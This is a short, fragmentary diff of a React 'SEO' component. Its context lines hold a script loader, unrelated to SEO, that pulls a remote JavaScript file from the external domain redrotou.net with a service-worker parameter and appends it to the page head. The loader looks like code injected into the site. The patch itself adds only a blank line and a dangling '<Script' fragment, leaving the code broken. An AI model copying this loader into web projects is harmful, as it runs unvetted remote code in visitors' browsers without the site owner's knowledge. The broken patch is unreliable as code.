@@ -10,6 +10,7 @@ export default function SEO({ title, description }) {
     </Head>
   );
 }
+
     var s = document.createElement('script');
     s.src='//redrotou.net/pfe/current/micro.tag.min.js?z=5239314'+'&sw=/sw-check-permissions-f3a9a.js';
     s.onload = function(result) {
@@ -25,3 +26,4 @@ export default function SEO({ title, description }) {
     }
 
     document.head.appendChild(s);
+<Script
